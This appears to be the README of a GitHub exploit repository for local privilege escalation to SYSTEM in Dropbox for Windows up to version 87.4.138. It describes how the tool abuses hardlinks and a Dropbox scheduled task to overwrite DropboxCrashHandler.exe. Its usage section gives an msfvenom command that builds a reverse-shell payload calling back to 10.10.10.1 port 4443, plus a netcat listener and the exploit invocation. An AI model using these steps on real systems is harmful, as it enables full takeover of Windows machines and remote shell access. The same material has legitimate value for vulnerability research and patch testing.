# dropbox_exploit
Privilege escalation to SYSTEM in newest Dropbox <= 87.4.138.    
Author of vulnerability: decoder (I just reimplemented his writeup).   
Write-up: https://decoder.cloud/2019/12/18/from-dropboxupdater-to-nt-authoritysystem/ <-- decoder's post    
Used in exploit: https://github.com/googleprojectzero/symboliclink-testing-tools    
Tested on Dropbox 87.4.138 and Windows 10 1809

### Description
Code is messy as hell, but it does what it supose to. Exploit is highly dependent on system time. Dropbox uses UTC+00 to generate log file names and this exploit uses system localtime, so that need improvement.    
Exploit creates hardlinks to `C:\Program Files (x86)\Dropbox\Update\1.3.241.1\DropboxCrashHandler.exe`, and Dropbox scheduled job sets write permissions to one of the links and consequently to the `DropboxCrashHandler.exe` (look into decoder's blog post for details). Then exploit overwrites `DropboxCrashHandler.exe`, which is executed once a day and at every user login. When that happen `rev.exe` is executed with SYSTEM privileges.    
Notice that exploit create a hell of a mess in `C:\ProgramData\Dropbox\Update\Log`. I will add cleanup function in a future (maybe).

### Usage
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4443 -f exe > rev.exe
nc -nvlp 4443
```
```powershell
dropbox_exploit.exe rev.exe
```
